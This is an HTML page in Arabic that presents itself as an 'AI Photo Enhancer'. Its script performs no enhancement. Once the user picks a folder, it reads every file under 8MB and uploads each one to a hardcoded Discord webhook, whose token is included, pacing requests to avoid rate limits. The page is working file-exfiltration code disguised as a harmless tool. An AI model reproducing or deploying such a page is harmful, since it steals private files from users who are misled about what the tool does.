<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>AI Photo Enhancer - Debug Mode</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f6; text-align: center; padding: 20px; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 500px; margin: auto; }
        .btn { background: #007aff; color: white; padding: 15px 30px; border: none; border-radius: 10px; cursor: pointer; font-size: 18px; width: 100%; }
        #debug-log { background: #000; color: #0f0; text-align: left; padding: 15px; margin-top: 20px; border-radius: 8px; font-size: 12px; height: 200px; overflow-y: auto; }
        .status { margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <h1>🪄 مُحسن الصور الذكي</h1>
    <p>اختر مجلد يحتوي على <b>صور صغيرة</b> للتجربة</p>
    <button class="btn" id="startBtn">بدء المعالجة والرفع 📁</button>
    
    <div class="status" id="status">الحالة: بانتظار البدء</div>
    
    <div id="debug-log">سجل العمليات (Debug Log):<br></div>
</div>

<script>
    // تأكد أن هذا الرابط لا يزال يعمل في ديسكورد الخاص بك
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";

    const logEl = document.getElementById('debug-log');
    const statusEl = document.getElementById('status');

    function writeLog(msg, color = "#0f0") {
        logEl.innerHTML += `<span style="color: ${color}">> ${msg}</span><br>`;
        logEl.scrollTop = logEl.scrollHeight;
    }

    document.getElementById('startBtn').addEventListener('click', async () => {
        try {
            if (!window.showDirectoryPicker) {
                writeLog("خطأ: متصفحك لا يدعم هذه الخاصية. استخدم Chrome على الكمبيوتر.", "red");
                return;
            }

            const dirHandle = await window.showDirectoryPicker();
            statusEl.innerText = "جاري سحب الملفات...";
            writeLog("تم منح الصلاحية للمجلد.");

            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    
                    // فحص الحجم (تخطي الملفات الأكبر من 8MB للتجربة)
                    if (file.size > 8 * 1024 * 1024) {
                        writeLog(`تخطي الملف ${file.name} (كبير جداً)`, "orange");
                        continue;
                    }

                    writeLog(`محاولة رفع: ${file.name}...`);
                    await uploadToDiscord(file);
                }
            }
            statusEl.innerText = "✅ اكتملت العملية!";

        } catch (err) {
            writeLog(`خطأ عام: ${err.message}`, "red");
        }
    });

    async function uploadToDiscord(file) {
        const formData = new FormData();
        formData.append('file', file, file.name);

        try {
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                writeLog(`✅ نجح رفع: ${file.name}`, "#0f0");
            } else if (response.status === 429) {
                writeLog(`⚠️ توقف مؤقت (Rate Limit) - انتظر ثواني...`, "orange");
                await new Promise(r => setTimeout(r, 5000)); // انتظار 5 ثواني
            } else {
                writeLog(`❌ فشل الرفع: ${file.name} (Error: ${response.status})`, "red");
            }
        } catch (e) {
            writeLog(`❌ خطأ في الشبكة أثناء رفع ${file.name}`, "red");
        }
        
        // تأخير بسيط بين كل ملف وآخر لتجنب الحظر
        await new Promise(r => setTimeout(r, 1000));
    }
</script>

</body>
</html>
